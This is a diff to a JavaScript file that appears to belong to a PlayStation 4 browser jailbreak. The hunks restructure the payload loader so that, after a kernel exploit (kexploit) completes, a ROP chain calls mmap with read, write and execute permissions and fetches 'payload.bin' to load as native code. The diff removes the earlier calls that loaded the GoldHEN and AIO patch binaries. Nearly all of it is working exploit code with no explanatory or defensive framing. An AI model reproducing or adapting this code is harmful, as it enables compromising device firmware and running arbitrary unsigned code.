@@ -139,11 +139,6 @@ const leak_len = 16;
 const num_leaks = 5;
 const num_clobbers = 8;
 
-//Payload_Loader
- const PROT_READ = 1;
- const PROT_WRITE = 2;
- const PROT_EXEC = 4;
-
 let chain = null;
 var nogc = [];
 
@@ -1815,9 +1810,13 @@ function array_from_address(addr, size) {
     return og_array;
 }
 
-function PayloadLoader(Pfile)
-{
-    var loader_addr = chain.sysp(
+kexploit().then(() => {
+
+ const PROT_READ = 1;
+ const PROT_WRITE = 2;
+ const PROT_EXEC = 4;
+
+var loader_addr = chain.sysp(
   'mmap',
   new Int(0, 0),                         
   0x1000,                               
@@ -1832,7 +1831,7 @@ function PayloadLoader(Pfile)
 
  var req = new XMLHttpRequest();
  req.responseType = "arraybuffer";
- req.open('GET',Pfile);
+ req.open('GET','payload.bin');
  req.send();
  req.onreadystatechange = function () {
   if (req.readyState == 4) {
@@ -1856,17 +1855,5 @@ function PayloadLoader(Pfile)
     );	
    }
  };
-
-
-}
-
-kexploit().then(() => {
-
-//Load ABC fix as a regular Payload
-setTimeout(PayloadLoader("aio_patches.bin"),500);
-log("AIO Fixes Applied.!");
-//Load GoldHEN :)
-setTimeout(PayloadLoader("goldhen.bin"),500);
-log("GoldHEN Loaded.!");
 
 })
